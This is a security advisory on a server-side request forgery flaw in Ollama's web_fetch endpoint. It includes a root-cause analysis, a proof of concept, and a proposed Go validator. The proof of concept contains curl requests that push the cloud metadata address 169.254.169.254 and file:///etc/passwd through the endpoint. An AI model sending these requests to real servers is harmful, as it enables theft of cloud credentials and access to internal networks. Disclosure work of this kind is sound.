# SSRF via /api/experimental/web_fetch — Arbitrary URL Forwarded to Cloud Proxy Without Validation in ollama/ollama

**Target:** ollama/ollama
**Version:** ≤ 0.18.2
**CVSS:** 8.1 High (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N)
**CWE:** CWE-918: Server-Side Request Forgery (SSRF)
**Submitted:** 2026-03-24

---

## Summary

The `/api/experimental/web_fetch` endpoint (introduced in Ollama 0.18.x) accepts an arbitrary `url` parameter and forwards it to `ollama.com/api/web_fetch` **without any IP range or scheme validation**. An authenticated user (or any network peer if Ollama is exposed via `OLLAMA_HOST=0.0.0.0`) can supply internal addresses such as `http://169.254.169.254/latest/meta-data/` or `file:///etc/passwd`, causing ollama.com's backend to make an outbound request to those addresses — a classic Server-Side Request Forgery.

---

## Root Cause

**File:** `x/tools/webfetch.go` (lines ~55–60)

```go
// Validate URL
if _, err := url.Parse(urlStr); err != nil {
    return "", fmt.Errorf("invalid URL: %w", err)
}
```

`url.Parse()` accepts any syntactically valid URL, including:
- `http://169.254.169.254/` (AWS/GCP/Azure IMDS)
- `http://10.0.0.1/`, `http://192.168.x.x/`, `http://172.16.x.x/`
- `file:///etc/passwd`
- `gopher://`, `ftp://`, etc.

The validated URL is then marshalled into a JSON body and forwarded as-is to `https://ollama.com/api/web_fetch` via the cloud proxy in `server/cloud_proxy.go`. The cloud service is then expected to perform the actual HTTP fetch of that URL on the server-side.

**No second validation exists** in `server/cloud_proxy.go` or `server/routes.go` for the `/api/experimental/web_fetch` path.

---

## Proof of Concept

### Setup

```bash
# Start a capture server simulating ollama.com
python3 -c "
import http.server
class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get('Content-Length', 0))
        b = self.rfile.read(n)
        print(f'CAPTURED: path={self.path} body={b.decode()}', flush=True)
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{\"title\":\"test\",\"content\":\"ok\"}')
    def log_message(self, *a): pass
http.server.HTTPServer(('127.0.0.1', 19999), H).serve_forever()
" &

# Start Ollama with cloud proxy redirected to capture server
OLLAMA_HOST=127.0.0.1:11435 OLLAMA_CLOUD_BASE_URL=http://127.0.0.1:19999 ollama serve &
sleep 3
```

### Exploit

```bash
# SSRF: AWS cloud metadata
curl -s -X POST http://127.0.0.1:11435/api/experimental/web_fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'
# → {"title":"test","content":"ok"}

# File read scheme
curl -s -X POST http://127.0.0.1:11435/api/experimental/web_fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"file:///etc/passwd"}'
```

### Confirmed Output (capture server)

```
CAPTURED: path=/api/web_fetch?ts=1774303441 body={"url":"http://169.254.169.254/latest/meta-data/"}
CAPTURED: path=/api/web_fetch?ts=1774303441 body={"url":"file:///etc/passwd"}
CAPTURED: path=/api/web_fetch?ts=1774303442 body={"url":"https://httpbin.org/get"}
```

All three URLs — including the IMDS address and `file://` scheme — are forwarded to `ollama.com/api/web_fetch` signed with the user's Ollama key, without any filtering.

---

## Impact

| Scenario | Impact |
|---|---|
| ollama.com hosted on AWS/GCP/Azure | Attacker reads cloud IAM credentials / instance metadata via `http://169.254.169.254/` |
| ollama.com has internal services | SSRF pivot into ollama.com's internal network |
| `file://` scheme processed | Potential local file read on ollama.com's server |
| `OLLAMA_HOST=0.0.0.0` (server deployment) | Any network peer can trigger these SSRF requests using the server owner's signed credentials |

The SSRF occurs on **ollama.com's infrastructure** (the cloud side), not the local machine. This means an authenticated Ollama user can cause ollama.com to make arbitrary outbound HTTP requests to internal cloud metadata services or private network ranges.

---

## Verification Script

A standalone script is provided: [`verify_ollama_ssrf.py`](verify_ollama_ssrf.py)

```bash
# Install: no dependencies beyond Python 3.8+ standard library
# Ollama must be in PATH

python3 verify_ollama_ssrf.py

# If Ollama is already running on :11435 with OLLAMA_CLOUD_BASE_URL set:
python3 verify_ollama_ssrf.py --skip-server
```

The script:
1. Starts a local HTTP capture server (simulates `ollama.com/api/web_fetch`)
2. Starts Ollama with `OLLAMA_CLOUD_BASE_URL` redirected to the capture server
3. Sends 7 test URLs (IMDS, `file://`, RFC1918 ranges, loopback, GCP hostname, legit HTTPS)
4. Confirms each dangerous URL is forwarded **without filtering** — output in RED
5. Runs the proposed Go fix as a Python equivalent — confirms it blocks all dangerous URLs

Expected output:
```
[STEP 2] Confirm SSRF — verify URLs forwarded without filtering
  [VULN] AWS IMDS (cloud metadata) → forwarded: http://169.254.169.254/latest/meta-data/
  [VULN] file:// scheme            → forwarded: file:///etc/passwd
  [VULN] RFC1918 private (10.x)    → forwarded: http://10.0.0.1/admin
  ...
  RESULT: VULNERABLE — unsafe URLs forwarded to cloud backend

[STEP 3] Verify fix — proposed validator blocks dangerous URLs
  [+] BLOCKED: AWS IMDS → URL targets a restricted metadata host
  [+] BLOCKED: file:// scheme → URL scheme 'file' not allowed
  ...
  FIX: Proposed validator correctly blocks all dangerous URLs
```

---

## Occurrences

| File | Location |
|---|---|
| [`x/tools/webfetch.go`](https://github.com/ollama/ollama/blob/main/x/tools/webfetch.go) | `url.Parse()` only — no IP/scheme filter |
| [`app/tools/web_fetch.go`](https://github.com/ollama/ollama/blob/main/app/tools/web_fetch.go) | No URL validation at all before forwarding |

---

## Fix

Add IP range and scheme validation before forwarding the URL to the cloud proxy:

```go
import "net"

func validateFetchURL(rawURL string) error {
    u, err := url.Parse(rawURL)
    if err != nil {
        return fmt.Errorf("invalid URL: %w", err)
    }
    // Block non-HTTP schemes
    if u.Scheme != "http" && u.Scheme != "https" {
        return fmt.Errorf("URL scheme %q not allowed", u.Scheme)
    }
    // Block private/loopback/link-local addresses
    host := u.Hostname()
    ip := net.ParseIP(host)
    if ip != nil {
        if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() || ip.IsLinkLocalMulticast() {
            return fmt.Errorf("URL resolves to a private/internal address")
        }
    }
    // Block known cloud metadata hostnames
    blocked := []string{"metadata.google.internal", "169.254.169.254"}
    for _, b := range blocked {
        if strings.EqualFold(host, b) {
            return fmt.Errorf("URL targets a restricted host")
        }
    }
    return nil
}
```
